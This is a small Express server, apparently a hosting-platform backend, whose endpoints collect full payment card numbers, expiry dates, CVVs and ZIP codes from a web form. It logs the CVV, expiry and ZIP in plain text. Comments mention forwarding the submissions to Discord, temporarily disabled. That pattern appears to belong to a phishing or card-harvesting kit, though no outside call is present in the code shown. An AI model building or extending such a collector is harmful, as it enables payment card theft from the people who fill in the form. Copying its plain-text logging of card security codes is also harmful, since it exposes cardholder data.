const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Puerto de Railway o local
const PORT = process.env.PORT || 3000;

// Endpoint para recibir los datos del formulario
app.post('/api/submit-form', async (req, res) => {
    try {
        const { card, mm, aa, cvv, zip } = req.body;

        console.log('=== NEW FORM SUBMISSION ===');
        console.log('Data received:', { card: card ? card.substring(0, 4) + '****' : 'N/A', mm, aa, cvv, zip });

        // Por ahora, solo devolver éxito sin enviar a Discord
        console.log('Form processed successfully (Discord disabled for testing)');
        res.json({ success: true, message: 'Form received successfully' });

    } catch (error) {
        console.error('Error processing form:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Endpoint de prueba sin Discord
app.post('/api/test-form', (req, res) => {
    const { card, mm, aa, cvv, zip } = req.body;
    console.log('Test endpoint received:', { card: card ? '***' : 'N/A', mm, aa, cvv, zip: zip ? '***' : 'N/A' });
    res.json({ success: true, received: { card: card ? '***' : 'N/A', mm, aa, cvv, zip: zip ? '***' : 'N/A' } });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
